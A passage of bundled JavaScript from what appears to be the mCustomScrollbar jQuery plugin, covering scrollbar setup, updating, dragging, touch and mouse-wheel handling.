                return t.setWidth = t.set_width ? t.set_width : t.setWidth, t.setHeight = t.set_height ? t.set_height : t.setHeight, t.axis = t.horizontalScroll ? "x" : p(t.axis), t.scrollInertia = t.scrollInertia > 0 && t.scrollInertia < 17 ? 17 : t.scrollInertia, "object" != _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default()(t.mouseWheel) && 1 == t.mouseWheel && (t.mouseWheel = {
                  enable: !0,
                  scrollAmount: "auto",
                  axis: "y",
                  preventDefault: !1,
                  deltaFactor: "auto",
                  normalizeDelta: !1,
                  invert: !1
                }), t.mouseWheel.scrollAmount = t.mouseWheelPixels ? t.mouseWheelPixels : t.mouseWheel.scrollAmount, t.mouseWheel.normalizeDelta = t.advanced.normalizeMouseWheelDelta ? t.advanced.normalizeMouseWheelDelta : t.mouseWheel.normalizeDelta, t.scrollButtons.scrollType = g(t.scrollButtons.scrollType), h(t), e(o).each(function () {
                  var o = e(this);
                  if (!o.data(a)) {
                    o.data(a, {
                      idx: ++r,
                      opt: t,
                      scrollRatio: {
                        y: null,
                        x: null
                      },
                      overflowed: null,
                      contentReset: {
                        y: null,
                        x: null
                      },
                      bindEvents: !1,
                      tweenRunning: !1,
                      sequential: {},
                      langDir: o.css("direction"),
                      cbOffsets: null,
                      trigger: null,
                      poll: {
                        size: {
                          o: 0,
                          n: 0
                        },
                        img: {
                          o: 0,
                          n: 0
                        },
                        change: {
                          o: 0,
                          n: 0
                        }
                      }
                    });
                    var n = o.data(a),
                      i = n.opt,
                      l = o.data("mcs-axis"),
                      s = o.data("mcs-scrollbar-position"),
                      c = o.data("mcs-theme");
                    l && (i.axis = l), s && (i.scrollbarPosition = s), c && (i.theme = c, h(i)), v.call(this), n && i.callbacks.onCreate && "function" == typeof i.callbacks.onCreate && i.callbacks.onCreate.call(this), e("#mCSB_" + n.idx + "_container img:not(." + d[2] + ")").addClass(d[2]), u.update.call(null, o);
                  }
                });
              },
              update: function update(t, o) {
                var n = t || f.call(this);
                return e(n).each(function () {
                  var t = e(this);
                  if (t.data(a)) {
                    var n = t.data(a),
                      i = n.opt,
                      r = e("#mCSB_" + n.idx + "_container"),
                      l = e("#mCSB_" + n.idx),
                      s = [e("#mCSB_" + n.idx + "_dragger_vertical"), e("#mCSB_" + n.idx + "_dragger_horizontal")];
                    if (!r.length) return;
                    n.tweenRunning && Q(t), o && n && i.callbacks.onBeforeUpdate && "function" == typeof i.callbacks.onBeforeUpdate && i.callbacks.onBeforeUpdate.call(this), t.hasClass(d[3]) && t.removeClass(d[3]), t.hasClass(d[4]) && t.removeClass(d[4]), l.css("max-height", "none"), l.height() !== t.height() && l.css("max-height", t.height()), _.call(this), "y" === i.axis || i.advanced.autoExpandHorizontalScroll || r.css("width", x(r)), n.overflowed = y.call(this), M.call(this), i.autoDraggerLength && S.call(this), b.call(this), T.call(this);
                    var c = [Math.abs(r[0].offsetTop), Math.abs(r[0].offsetLeft)];
                    "x" !== i.axis && (n.overflowed[0] ? s[0].height() > s[0].parent().height() ? B.call(this) : (G(t, c[0].toString(), {
                      dir: "y",
                      dur: 0,
                      overwrite: "none"
                    }), n.contentReset.y = null) : (B.call(this), "y" === i.axis ? k.call(this) : "yx" === i.axis && n.overflowed[1] && G(t, c[1].toString(), {
                      dir: "x",
                      dur: 0,
                      overwrite: "none"
                    }))), "y" !== i.axis && (n.overflowed[1] ? s[1].width() > s[1].parent().width() ? B.call(this) : (G(t, c[1].toString(), {
                      dir: "x",
                      dur: 0,
                      overwrite: "none"
                    }), n.contentReset.x = null) : (B.call(this), "x" === i.axis ? k.call(this) : "yx" === i.axis && n.overflowed[0] && G(t, c[0].toString(), {
                      dir: "y",
                      dur: 0,
                      overwrite: "none"
                    }))), o && n && (2 === o && i.callbacks.onImageLoad && "function" == typeof i.callbacks.onImageLoad ? i.callbacks.onImageLoad.call(this) : 3 === o && i.callbacks.onSelectorChange && "function" == typeof i.callbacks.onSelectorChange ? i.callbacks.onSelectorChange.call(this) : i.callbacks.onUpdate && "function" == typeof i.callbacks.onUpdate && i.callbacks.onUpdate.call(this)), N.call(this);
                  }
                });
              },
              scrollTo: function scrollTo(t, o) {
                if ("undefined" != typeof t && null != t) {
                  var n = f.call(this);
                  return e(n).each(function () {
                    var n = e(this);
                    if (n.data(a)) {
                      var i = n.data(a),
                        r = i.opt,
                        l = {
                          trigger: "external",
                          scrollInertia: r.scrollInertia,
                          scrollEasing: "mcsEaseInOut",
                          moveDragger: !1,
                          timeout: 60,
                          callbacks: !0,
                          onStart: !0,
                          onUpdate: !0,
                          onComplete: !0
                        },
                        s = e.extend(!0, {}, l, o),
                        c = Y.call(this, t),
                        d = s.scrollInertia > 0 && s.scrollInertia < 17 ? 17 : s.scrollInertia;
                      c[0] = X.call(this, c[0], "y"), c[1] = X.call(this, c[1], "x"), s.moveDragger && (c[0] *= i.scrollRatio.y, c[1] *= i.scrollRatio.x), s.dur = ne() ? 0 : d, setTimeout(function () {
                        null !== c[0] && "undefined" != typeof c[0] && "x" !== r.axis && i.overflowed[0] && (s.dir = "y", s.overwrite = "all", G(n, c[0].toString(), s)), null !== c[1] && "undefined" != typeof c[1] && "y" !== r.axis && i.overflowed[1] && (s.dir = "x", s.overwrite = "none", G(n, c[1].toString(), s));
                      }, s.timeout);
                    }
                  });
                }
              },
              stop: function stop() {
                var t = f.call(this);
                return e(t).each(function () {
                  var t = e(this);
                  t.data(a) && Q(t);
                });
              },
              disable: function disable(t) {
                var o = f.call(this);
                return e(o).each(function () {
                  var o = e(this);
                  if (o.data(a)) {
                    o.data(a);
                    N.call(this, "remove"), k.call(this), t && B.call(this), M.call(this, !0), o.addClass(d[3]);
                  }
                });
              },
              destroy: function destroy() {
                var t = f.call(this);
                return e(t).each(function () {
                  var n = e(this);
                  if (n.data(a)) {
                    var i = n.data(a),
                      r = i.opt,
                      l = e("#mCSB_" + i.idx),
                      s = e("#mCSB_" + i.idx + "_container"),
                      c = e(".mCSB_" + i.idx + "_scrollbar");
                    r.live && m(r.liveSelector || e(t).selector), N.call(this, "remove"), k.call(this), B.call(this), n.removeData(a), $(this, "mcs"), c.remove(), s.find("img." + d[2]).removeClass(d[2]), l.replaceWith(s.contents()), n.removeClass(o + " _" + a + "_" + i.idx + " " + d[6] + " " + d[7] + " " + d[5] + " " + d[3]).addClass(d[4]);
                  }
                });
              }
            },
            f = function f() {
              return "object" != _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default()(e(this)) || e(this).length < 1 ? n : this;
            },
            h = function h(t) {
              var o = ["rounded", "rounded-dark", "rounded-dots", "rounded-dots-dark"],
                a = ["rounded-dots", "rounded-dots-dark", "3d", "3d-dark", "3d-thick", "3d-thick-dark", "inset", "inset-dark", "inset-2", "inset-2-dark", "inset-3", "inset-3-dark"],
                n = ["minimal", "minimal-dark"],
                i = ["minimal", "minimal-dark"],
                r = ["minimal", "minimal-dark"];
              t.autoDraggerLength = e.inArray(t.theme, o) > -1 ? !1 : t.autoDraggerLength, t.autoExpandScrollbar = e.inArray(t.theme, a) > -1 ? !1 : t.autoExpandScrollbar, t.scrollButtons.enable = e.inArray(t.theme, n) > -1 ? !1 : t.scrollButtons.enable, t.autoHideScrollbar = e.inArray(t.theme, i) > -1 ? !0 : t.autoHideScrollbar, t.scrollbarPosition = e.inArray(t.theme, r) > -1 ? "outside" : t.scrollbarPosition;
            },
            m = function m(e) {
              l[e] && (clearTimeout(l[e]), $(l, e));
            },
            p = function p(e) {
              return "yx" === e || "xy" === e || "auto" === e ? "yx" : "x" === e || "horizontal" === e ? "x" : "y";
            },
            g = function g(e) {
              return "stepped" === e || "pixels" === e || "step" === e || "click" === e ? "stepped" : "stepless";
            },
            v = function v() {
              var t = e(this),
                n = t.data(a),
                i = n.opt,
                r = i.autoExpandScrollbar ? " " + d[1] + "_expand" : "",
                l = ["<div id='mCSB_" + n.idx + "_scrollbar_vertical' class='mCSB_scrollTools mCSB_" + n.idx + "_scrollbar mCS-" + i.theme + " mCSB_scrollTools_vertical" + r + "'><div class='" + d[12] + "'><div id='mCSB_" + n.idx + "_dragger_vertical' class='mCSB_dragger' style='position:absolute;'><div class='mCSB_dragger_bar' /></div><div class='mCSB_draggerRail' /></div></div>", "<div id='mCSB_" + n.idx + "_scrollbar_horizontal' class='mCSB_scrollTools mCSB_" + n.idx + "_scrollbar mCS-" + i.theme + " mCSB_scrollTools_horizontal" + r + "'><div class='" + d[12] + "'><div id='mCSB_" + n.idx + "_dragger_horizontal' class='mCSB_dragger' style='position:absolute;'><div class='mCSB_dragger_bar' /></div><div class='mCSB_draggerRail' /></div></div>"],
                s = "yx" === i.axis ? "mCSB_vertical_horizontal" : "x" === i.axis ? "mCSB_horizontal" : "mCSB_vertical",
                c = "yx" === i.axis ? l[0] + l[1] : "x" === i.axis ? l[1] : l[0],
                u = "yx" === i.axis ? "<div id='mCSB_" + n.idx + "_container_wrapper' class='mCSB_container_wrapper' />" : "",
                f = i.autoHideScrollbar ? " " + d[6] : "",
                h = "x" !== i.axis && "rtl" === n.langDir ? " " + d[7] : "";
              i.setWidth && t.css("width", i.setWidth), i.setHeight && t.css("height", i.setHeight), i.setLeft = "y" !== i.axis && "rtl" === n.langDir ? "989999px" : i.setLeft, t.addClass(o + " _" + a + "_" + n.idx + f + h).wrapInner("<div id='mCSB_" + n.idx + "' class='mCustomScrollBox mCS-" + i.theme + " " + s + "'><div id='mCSB_" + n.idx + "_container' class='mCSB_container' style='position:relative; top:" + i.setTop + "; left:" + i.setLeft + ";' dir='" + n.langDir + "' /></div>");
              var m = e("#mCSB_" + n.idx),
                p = e("#mCSB_" + n.idx + "_container");
              "y" === i.axis || i.advanced.autoExpandHorizontalScroll || p.css("width", x(p)), "outside" === i.scrollbarPosition ? ("static" === t.css("position") && t.css("position", "relative"), t.css("overflow", "visible"), m.addClass("mCSB_outside").after(c)) : (m.addClass("mCSB_inside").append(c), p.wrap(u)), w.call(this);
              var g = [e("#mCSB_" + n.idx + "_dragger_vertical"), e("#mCSB_" + n.idx + "_dragger_horizontal")];
              g[0].css("min-height", g[0].height()), g[1].css("min-width", g[1].width());
            },
            x = function x(t) {
              var o = [t[0].scrollWidth, Math.max.apply(Math, t.children().map(function () {
                  return e(this).outerWidth(!0);
                }).get())],
                a = t.parent().width();
              return o[0] > a ? o[0] : o[1] > a ? o[1] : "100%";
            },
            _ = function _() {
              var t = e(this),
                o = t.data(a),
                n = o.opt,
                i = e("#mCSB_" + o.idx + "_container");
              if (n.advanced.autoExpandHorizontalScroll && "y" !== n.axis) {
                i.css({
                  width: "auto",
                  "min-width": 0,
                  "overflow-x": "scroll"
                });
                var r = Math.ceil(i[0].scrollWidth);
                3 === n.advanced.autoExpandHorizontalScroll || 2 !== n.advanced.autoExpandHorizontalScroll && r > i.parent().width() ? i.css({
                  width: r,
                  "min-width": "100%",
                  "overflow-x": "inherit"
                }) : i.css({
                  "overflow-x": "inherit",
                  position: "absolute"
                }).wrap("<div class='mCSB_h_wrapper' style='position:relative; left:0; width:999999px;' />").css({
                  width: Math.ceil(i[0].getBoundingClientRect().right + .4) - Math.floor(i[0].getBoundingClientRect().left),
                  "min-width": "100%",
                  position: "relative"
                }).unwrap();
              }
            },
            w = function w() {
              var t = e(this),
                o = t.data(a),
                n = o.opt,
                i = e(".mCSB_" + o.idx + "_scrollbar:first"),
                r = oe(n.scrollButtons.tabindex) ? "tabindex='" + n.scrollButtons.tabindex + "'" : "",
                l = ["<a href='#' class='" + d[13] + "' " + r + " />", "<a href='#' class='" + d[14] + "' " + r + " />", "<a href='#' class='" + d[15] + "' " + r + " />", "<a href='#' class='" + d[16] + "' " + r + " />"],
                s = ["x" === n.axis ? l[2] : l[0], "x" === n.axis ? l[3] : l[1], l[2], l[3]];
              n.scrollButtons.enable && i.prepend(s[0]).append(s[1]).next(".mCSB_scrollTools").prepend(s[2]).append(s[3]);
            },
            S = function S() {
              var t = e(this),
                o = t.data(a),
                n = e("#mCSB_" + o.idx),
                i = e("#mCSB_" + o.idx + "_container"),
                r = [e("#mCSB_" + o.idx + "_dragger_vertical"), e("#mCSB_" + o.idx + "_dragger_horizontal")],
                l = [n.height() / i.outerHeight(!1), n.width() / i.outerWidth(!1)],
                c = [parseInt(r[0].css("min-height")), Math.round(l[0] * r[0].parent().height()), parseInt(r[1].css("min-width")), Math.round(l[1] * r[1].parent().width())],
                d = s && c[1] < c[0] ? c[0] : c[1],
                u = s && c[3] < c[2] ? c[2] : c[3];
              r[0].css({
                height: d,
                "max-height": r[0].parent().height() - 10
              }).find(".mCSB_dragger_bar").css({
                "line-height": c[0] + "px"
              }), r[1].css({
                width: u,
                "max-width": r[1].parent().width() - 10
              });
            },
            b = function b() {
              var t = e(this),
                o = t.data(a),
                n = e("#mCSB_" + o.idx),
                i = e("#mCSB_" + o.idx + "_container"),
                r = [e("#mCSB_" + o.idx + "_dragger_vertical"), e("#mCSB_" + o.idx + "_dragger_horizontal")],
                l = [i.outerHeight(!1) - n.height(), i.outerWidth(!1) - n.width()],
                s = [l[0] / (r[0].parent().height() - r[0].height()), l[1] / (r[1].parent().width() - r[1].width())];
              o.scrollRatio = {
                y: s[0],
                x: s[1]
              };
            },
            C = function C(e, t, o) {
              var a = o ? d[0] + "_expanded" : "",
                n = e.closest(".mCSB_scrollTools");
              "active" === t ? (e.toggleClass(d[0] + " " + a), n.toggleClass(d[1]), e[0]._draggable = e[0]._draggable ? 0 : 1) : e[0]._draggable || ("hide" === t ? (e.removeClass(d[0]), n.removeClass(d[1])) : (e.addClass(d[0]), n.addClass(d[1])));
            },
            y = function y() {
              var t = e(this),
                o = t.data(a),
                n = e("#mCSB_" + o.idx),
                i = e("#mCSB_" + o.idx + "_container"),
                r = null == o.overflowed ? i.height() : i.outerHeight(!1),
                l = null == o.overflowed ? i.width() : i.outerWidth(!1),
                s = i[0].scrollHeight,
                c = i[0].scrollWidth;
              return s > r && (r = s), c > l && (l = c), [r > n.height(), l > n.width()];
            },
            B = function B() {
              var t = e(this),
                o = t.data(a),
                n = o.opt,
                i = e("#mCSB_" + o.idx),
                r = e("#mCSB_" + o.idx + "_container"),
                l = [e("#mCSB_" + o.idx + "_dragger_vertical"), e("#mCSB_" + o.idx + "_dragger_horizontal")];
              if (Q(t), ("x" !== n.axis && !o.overflowed[0] || "y" === n.axis && o.overflowed[0]) && (l[0].add(r).css("top", 0), G(t, "_resetY")), "y" !== n.axis && !o.overflowed[1] || "x" === n.axis && o.overflowed[1]) {
                var s = dx = 0;
                "rtl" === o.langDir && (s = i.width() - r.outerWidth(!1), dx = Math.abs(s / o.scrollRatio.x)), r.css("left", s), l[1].css("left", dx), G(t, "_resetX");
              }
            },
            T = function T() {
              function t() {
                r = setTimeout(function () {
                  e.event.special.mousewheel ? (clearTimeout(r), W.call(o[0])) : t();
                }, 100);
              }
              var o = e(this),
                n = o.data(a),
                i = n.opt;
              if (!n.bindEvents) {
                if (I.call(this), i.contentTouchScroll && D.call(this), E.call(this), i.mouseWheel.enable) {
                  var r;
                  t();
                }
                P.call(this), U.call(this), i.advanced.autoScrollOnFocus && H.call(this), i.scrollButtons.enable && F.call(this), i.keyboard.enable && q.call(this), n.bindEvents = !0;
              }
            },
            k = function k() {
              var t = e(this),
                o = t.data(a),
                n = o.opt,
                i = a + "_" + o.idx,
                r = ".mCSB_" + o.idx + "_scrollbar",
                l = e("#mCSB_" + o.idx + ",#mCSB_" + o.idx + "_container,#mCSB_" + o.idx + "_container_wrapper," + r + " ." + d[12] + ",#mCSB_" + o.idx + "_dragger_vertical,#mCSB_" + o.idx + "_dragger_horizontal," + r + ">a"),
                s = e("#mCSB_" + o.idx + "_container");
              n.advanced.releaseDraggableSelectors && l.add(e(n.advanced.releaseDraggableSelectors)), n.advanced.extraDraggableSelectors && l.add(e(n.advanced.extraDraggableSelectors)), o.bindEvents && (e(document).add(e(!A() || top.document)).unbind("." + i), l.each(function () {
                e(this).unbind("." + i);
              }), clearTimeout(t[0]._focusTimeout), $(t[0], "_focusTimeout"), clearTimeout(o.sequential.step), $(o.sequential, "step"), clearTimeout(s[0].onCompleteTimeout), $(s[0], "onCompleteTimeout"), o.bindEvents = !1);
            },
            M = function M(t) {
              var o = e(this),
                n = o.data(a),
                i = n.opt,
                r = e("#mCSB_" + n.idx + "_container_wrapper"),
                l = r.length ? r : e("#mCSB_" + n.idx + "_container"),
                s = [e("#mCSB_" + n.idx + "_scrollbar_vertical"), e("#mCSB_" + n.idx + "_scrollbar_horizontal")],
                c = [s[0].find(".mCSB_dragger"), s[1].find(".mCSB_dragger")];
              "x" !== i.axis && (n.overflowed[0] && !t ? (s[0].add(c[0]).add(s[0].children("a")).css("display", "block"), l.removeClass(d[8] + " " + d[10])) : (i.alwaysShowScrollbar ? (2 !== i.alwaysShowScrollbar && c[0].css("display", "none"), l.removeClass(d[10])) : (s[0].css("display", "none"), l.addClass(d[10])), l.addClass(d[8]))), "y" !== i.axis && (n.overflowed[1] && !t ? (s[1].add(c[1]).add(s[1].children("a")).css("display", "block"), l.removeClass(d[9] + " " + d[11])) : (i.alwaysShowScrollbar ? (2 !== i.alwaysShowScrollbar && c[1].css("display", "none"), l.removeClass(d[11])) : (s[1].css("display", "none"), l.addClass(d[11])), l.addClass(d[9]))), n.overflowed[0] || n.overflowed[1] ? o.removeClass(d[5]) : o.addClass(d[5]);
            },
            O = function O(t) {
              var o = t.type,
                a = t.target.ownerDocument !== document && null !== frameElement ? [e(frameElement).offset().top, e(frameElement).offset().left] : null,
                n = A() && t.target.ownerDocument !== top.document && null !== frameElement ? [e(t.view.frameElement).offset().top, e(t.view.frameElement).offset().left] : [0, 0];
              switch (o) {
                case "pointerdown":
                case "MSPointerDown":
                case "pointermove":
                case "MSPointerMove":
                case "pointerup":
                case "MSPointerUp":
                  return a ? [t.originalEvent.pageY - a[0] + n[0], t.originalEvent.pageX - a[1] + n[1], !1] : [t.originalEvent.pageY, t.originalEvent.pageX, !1];
                case "touchstart":
                case "touchmove":
                case "touchend":
                  var i = t.originalEvent.touches[0] || t.originalEvent.changedTouches[0],
                    r = t.originalEvent.touches.length || t.originalEvent.changedTouches.length;
                  return t.target.ownerDocument !== document ? [i.screenY, i.screenX, r > 1] : [i.pageY, i.pageX, r > 1];
                default:
                  return a ? [t.pageY - a[0] + n[0], t.pageX - a[1] + n[1], !1] : [t.pageY, t.pageX, !1];
              }
            },
            I = function I() {
              function t(e, t, a, n) {
                if (h[0].idleTimer = d.scrollInertia < 233 ? 250 : 0, o.attr("id") === f[1]) var i = "x",
                  s = (o[0].offsetLeft - t + n) * l.scrollRatio.x;else var i = "y",
                  s = (o[0].offsetTop - e + a) * l.scrollRatio.y;
                G(r, s.toString(), {
                  dir: i,
                  drag: !0
                });
              }
              var o,
                n,
                i,
                r = e(this),
                l = r.data(a),
                d = l.opt,
                u = a + "_" + l.idx,
                f = ["mCSB_" + l.idx + "_dragger_vertical", "mCSB_" + l.idx + "_dragger_horizontal"],
                h = e("#mCSB_" + l.idx + "_container"),
                m = e("#" + f[0] + ",#" + f[1]),
                p = d.advanced.releaseDraggableSelectors ? m.add(e(d.advanced.releaseDraggableSelectors)) : m,
                g = d.advanced.extraDraggableSelectors ? e(!A() || top.document).add(e(d.advanced.extraDraggableSelectors)) : e(!A() || top.document);
              m.bind("contextmenu." + u, function (e) {
                e.preventDefault();
              }).bind("mousedown." + u + " touchstart." + u + " pointerdown." + u + " MSPointerDown." + u, function (t) {
                if (t.stopImmediatePropagation(), t.preventDefault(), ee(t)) {
                  c = !0, s && (document.onselectstart = function () {
                    return !1;
                  }), L.call(h, !1), Q(r), o = e(this);
                  var a = o.offset(),
                    l = O(t)[0] - a.top,
                    u = O(t)[1] - a.left,
                    f = o.height() + a.top,
                    m = o.width() + a.left;
                  f > l && l > 0 && m > u && u > 0 && (n = l, i = u), C(o, "active", d.autoExpandScrollbar);
                }
              }).bind("touchmove." + u, function (e) {
                e.stopImmediatePropagation(), e.preventDefault();
                var a = o.offset(),
                  r = O(e)[0] - a.top,
                  l = O(e)[1] - a.left;
                t(n, i, r, l);
              }), e(document).add(g).bind("mousemove." + u + " pointermove." + u + " MSPointerMove." + u, function (e) {
                if (o) {
                  var a = o.offset(),
                    r = O(e)[0] - a.top,
                    l = O(e)[1] - a.left;
                  if (n === r && i === l) return;
                  t(n, i, r, l);
                }
              }).add(p).bind("mouseup." + u + " touchend." + u + " pointerup." + u + " MSPointerUp." + u, function () {
                o && (C(o, "active", d.autoExpandScrollbar), o = null), c = !1, s && (document.onselectstart = null), L.call(h, !0);
              });
            },
            D = function D() {
              function o(e) {
                if (!te(e) || c || O(e)[2]) return void (t = 0);
                t = 1, b = 0, C = 0, d = 1, y.removeClass("mCS_touch_action");
                var o = I.offset();
                u = O(e)[0] - o.top, f = O(e)[1] - o.left, z = [O(e)[0], O(e)[1]];
              }
              function n(e) {
                if (te(e) && !c && !O(e)[2] && (T.documentTouchScroll || e.preventDefault(), e.stopImmediatePropagation(), (!C || b) && d)) {
                  g = K();
                  var t = M.offset(),
                    o = O(e)[0] - t.top,
                    a = O(e)[1] - t.left,
                    n = "mcsLinearOut";
                  if (E.push(o), W.push(a), z[2] = Math.abs(O(e)[0] - z[0]), z[3] = Math.abs(O(e)[1] - z[1]), B.overflowed[0]) var i = D[0].parent().height() - D[0].height(),
                    r = u - o > 0 && o - u > -(i * B.scrollRatio.y) && (2 * z[3] < z[2] || "yx" === T.axis);
                  if (B.overflowed[1]) var l = D[1].parent().width() - D[1].width(),
                    h = f - a > 0 && a - f > -(l * B.scrollRatio.x) && (2 * z[2] < z[3] || "yx" === T.axis);
                  r || h ? (U || e.preventDefault(), b = 1) : (C = 1, y.addClass("mCS_touch_action")), U && e.preventDefault(), w = "yx" === T.axis ? [u - o, f - a] : "x" === T.axis ? [null, f - a] : [u - o, null], I[0].idleTimer = 250, B.overflowed[0] && s(w[0], R, n, "y", "all", !0), B.overflowed[1] && s(w[1], R, n, "x", L, !0);
                }
              }
              function i(e) {
                if (!te(e) || c || O(e)[2]) return void (t = 0);
                t = 1, e.stopImmediatePropagation(), Q(y), p = K();
                var o = M.offset();
                h = O(e)[0] - o.top, m = O(e)[1] - o.left, E = [], W = [];
              }
              function r(e) {
                if (te(e) && !c && !O(e)[2]) {
                  d = 0, e.stopImmediatePropagation(), b = 0, C = 0, v = K();
                  var t = M.offset(),
                    o = O(e)[0] - t.top,
                    a = O(e)[1] - t.left;
                  if (!(v - g > 30)) {
                    _ = 1e3 / (v - p);
                    var n = "mcsEaseOut",
                      i = 2.5 > _,
                      r = i ? [E[E.length - 2], W[W.length - 2]] : [0, 0];
                    x = i ? [o - r[0], a - r[1]] : [o - h, a - m];
                    var u = [Math.abs(x[0]), Math.abs(x[1])];
                    _ = i ? [Math.abs(x[0] / 4), Math.abs(x[1] / 4)] : [_, _];
                    var f = [Math.abs(I[0].offsetTop) - x[0] * l(u[0] / _[0], _[0]), Math.abs(I[0].offsetLeft) - x[1] * l(u[1] / _[1], _[1])];
                    w = "yx" === T.axis ? [f[0], f[1]] : "x" === T.axis ? [null, f[1]] : [f[0], null], S = [4 * u[0] + T.scrollInertia, 4 * u[1] + T.scrollInertia];
                    var y = parseInt(T.contentTouchScroll) || 0;
                    w[0] = u[0] > y ? w[0] : 0, w[1] = u[1] > y ? w[1] : 0, B.overflowed[0] && s(w[0], S[0], n, "y", L, !1), B.overflowed[1] && s(w[1], S[1], n, "x", L, !1);
                  }
                }
              }
              function l(e, t) {
                var o = [1.5 * t, 2 * t, t / 1.5, t / 2];
                return e > 90 ? t > 4 ? o[0] : o[3] : e > 60 ? t > 3 ? o[3] : o[2] : e > 30 ? t > 8 ? o[1] : t > 6 ? o[0] : t > 4 ? t : o[2] : t > 8 ? t : o[3];
              }
              function s(e, t, o, a, n, i) {
                e && G(y, e.toString(), {
                  dur: t,
                  scrollEasing: o,
                  dir: a,
                  overwrite: n,
                  drag: i
                });
              }
              var d,
                u,
                f,
                h,
                m,
                p,
                g,
                v,
                x,
                _,
                w,
                S,
                b,
                C,
                y = e(this),
                B = y.data(a),
                T = B.opt,
                k = a + "_" + B.idx,
                M = e("#mCSB_" + B.idx),
                I = e("#mCSB_" + B.idx + "_container"),
                D = [e("#mCSB_" + B.idx + "_dragger_vertical"), e("#mCSB_" + B.idx + "_dragger_horizontal")],
                E = [],
                W = [],
                R = 0,
                L = "yx" === T.axis ? "none" : "all",
                z = [],
                P = I.find("iframe"),
                H = ["touchstart." + k + " pointerdown." + k + " MSPointerDown." + k, "touchmove." + k + " pointermove." + k + " MSPointerMove." + k, "touchend." + k + " pointerup." + k + " MSPointerUp." + k],
                U = void 0 !== document.body.style.touchAction && "" !== document.body.style.touchAction;
              I.bind(H[0], function (e) {
                o(e);
              }).bind(H[1], function (e) {
                n(e);
              }), M.bind(H[0], function (e) {
                i(e);
              }).bind(H[2], function (e) {
                r(e);
              }), P.length && P.each(function () {
                e(this).bind("load", function () {
                  A(this) && e(this.contentDocument || this.contentWindow.document).bind(H[0], function (e) {
                    o(e), i(e);
                  }).bind(H[1], function (e) {
                    n(e);
                  }).bind(H[2], function (e) {
                    r(e);
                  });
                });
              });
            },
            E = function E() {
              function o() {
                return window.getSelection ? window.getSelection().toString() : document.selection && "Control" != document.selection.type ? document.selection.createRange().text : 0;
              }
              function n(e, t, o) {
                d.type = o && i ? "stepped" : "stepless", d.scrollAmount = 10, j(r, e, t, "mcsLinearOut", o ? 60 : null);
              }
              var i,
                r = e(this),
                l = r.data(a),
                s = l.opt,
                d = l.sequential,
                u = a + "_" + l.idx,
                f = e("#mCSB_" + l.idx + "_container"),
                h = f.parent();
              f.bind("mousedown." + u, function () {
                t || i || (i = 1, c = !0);
              }).add(document).bind("mousemove." + u, function (e) {
                if (!t && i && o()) {
                  var a = f.offset(),
                    r = O(e)[0] - a.top + f[0].offsetTop,
                    c = O(e)[1] - a.left + f[0].offsetLeft;
                  r > 0 && r < h.height() && c > 0 && c < h.width() ? d.step && n("off", null, "stepped") : ("x" !== s.axis && l.overflowed[0] && (0 > r ? n("on", 38) : r > h.height() && n("on", 40)), "y" !== s.axis && l.overflowed[1] && (0 > c ? n("on", 37) : c > h.width() && n("on", 39)));
                }
              }).bind("mouseup." + u + " dragend." + u, function () {
                t || (i && (i = 0, n("off", null)), c = !1);
              });
            },
            W = function W() {
              function t(t, a) {
                if (Q(o), !z(o, t.target)) {
                  var r = "auto" !== i.mouseWheel.deltaFactor ? parseInt(i.mouseWheel.deltaFactor) : s && t.deltaFactor < 100 ? 100 : t.deltaFactor || 100,
                    d = i.scrollInertia;
                  if ("x" === i.axis || "x" === i.mouseWheel.axis) var u = "x",
                    f = [Math.round(r * n.scrollRatio.x), parseInt(i.mouseWheel.scrollAmount)],
                    h = "auto" !== i.mouseWheel.scrollAmount ? f[1] : f[0] >= l.width() ? .9 * l.width() : f[0],
                    m = Math.abs(e("#mCSB_" + n.idx + "_container")[0].offsetLeft),
                    p = c[1][0].offsetLeft,
                    g = c[1].parent().width() - c[1].width(),
                    v = "y" === i.mouseWheel.axis ? t.deltaY || a : t.deltaX;else var u = "y",
                    f = [Math.round(r * n.scrollRatio.y), parseInt(i.mouseWheel.scrollAmount)],
                    h = "auto" !== i.mouseWheel.scrollAmount ? f[1] : f[0] >= l.height() ? .9 * l.height() : f[0],
                    m = Math.abs(e("#mCSB_" + n.idx + "_container")[0].offsetTop),
                    p = c[0][0].offsetTop,
                    g = c[0].parent().height() - c[0].height(),
                    v = t.deltaY || a;
                  "y" === u && !n.overflowed[0] || "x" === u && !n.overflowed[1] || ((i.mouseWheel.invert || t.webkitDirectionInvertedFromDevice) && (v = -v), i.mouseWheel.normalizeDelta && (v = 0 > v ? -1 : 1), (v > 0 && 0 !== p || 0 > v && p !== g || i.mouseWheel.preventDefault) && (t.stopImmediatePropagation(), t.preventDefault()), t.deltaFactor < 5 && !i.mouseWheel.normalizeDelta && (h = t.deltaFactor, d = 17), G(o, (m - v * h).toString(), {
                    dir: u,
                    dur: d
                  }));
                }
              }
              if (e(this).data(a)) {
                var o = e(this),
                  n = o.data(a),
                  i = n.opt,
                  r = a + "_" + n.idx,
                  l = e("#mCSB_" + n.idx),
                  c = [e("#mCSB_" + n.idx + "_dragger_vertical"), e("#mCSB_" + n.idx + "_dragger_horizontal")],
                  d = e("#mCSB_" + n.idx + "_container").find("iframe");
                d.length && d.each(function () {
                  e(this).bind("load", function () {
                    A(this) && e(this.contentDocument || this.contentWindow.document).bind("mousewheel." + r, function (e, o) {
                      t(e, o);
                    });
                  });
                }), l.bind("mousewheel." + r, function (e, o) {
                  t(e, o);
                });
              }
            },
            R = new Object(),
            A = function A(t) {
              var o = !1,
                a = !1,
                n = null;
              if (void 0 === t ? a = "#empty" : void 0 !== e(t).attr("id") && (a = e(t).attr("id")), a !== !1 && void 0 !== R[a]) return R[a];
              if (t) {
                try {
                  var i = t.contentDocument || t.contentWindow.document;
                  n = i.body.innerHTML;
                } catch (r) {}
                o = null !== n;
              } else {
                try {
                  var i = top.document;
                  n = i.body.innerHTML;
                } catch (r) {}
                o = null !== n;
              }
              return a !== !1 && (R[a] = o), o;
            },
            L = function L(e) {
              var t = this.find("iframe");
              if (t.length) {
                var o = e ? "auto" : "none";
                t.css("pointer-events", o);
              }
            },
            z = function z(t, o) {
              var n = o.nodeName.toLowerCase(),
                i = t.data(a).opt.mouseWheel.disableOver,
                r = ["select", "textarea"];
              return e.inArray(n, i) > -1 && !(e.inArray(n, r) > -1 && !e(o).is(":focus"));
            },
            P = function P() {
              var t,
                o = e(this),
                n = o.data(a),
                i = a + "_" + n.idx,
                r = e("#mCSB_" + n.idx + "_container"),
                l = r.parent(),
